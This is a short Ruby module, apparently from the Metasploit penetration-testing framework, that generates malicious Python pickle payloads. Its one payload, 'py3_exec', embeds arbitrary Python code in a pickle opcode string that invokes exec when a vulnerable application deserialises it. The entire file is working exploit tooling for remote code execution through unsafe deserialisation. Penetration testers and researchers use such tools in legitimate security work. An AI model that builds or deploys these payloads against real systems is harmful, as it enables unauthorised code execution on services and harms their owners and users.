# -*- coding: binary -*-

# Python deserialization Utility
module Msf
  module Util
    # Python deserialization class
    class PythonDeserialization
      # That could be in the future a list of payloads used to exploit the Python deserialization vulnerability.
      PAYLOADS = {
        # this payload will work with Python 3.x targets to execute Python code in place
        py3_exec: proc do |python_code|
          escaped = python_code.gsub(/[\\\n\r]/) { |t| "\\u00#{t.ord.to_s(16).rjust(2, '0')}" }
          %|c__builtin__\nexec\np0\n(V#{escaped}\np1\ntp2\nRp3\n.|
        end
      }

      def self.payload(payload_name, command = nil)

        raise ArgumentError, "#{payload_name} payload not found in payloads" unless payload_names.include? payload_name.to_sym

        PAYLOADS[payload_name.to_sym].call(command)
      end

      def self.payload_names
        PAYLOADS.keys
      end

    end
  end
end
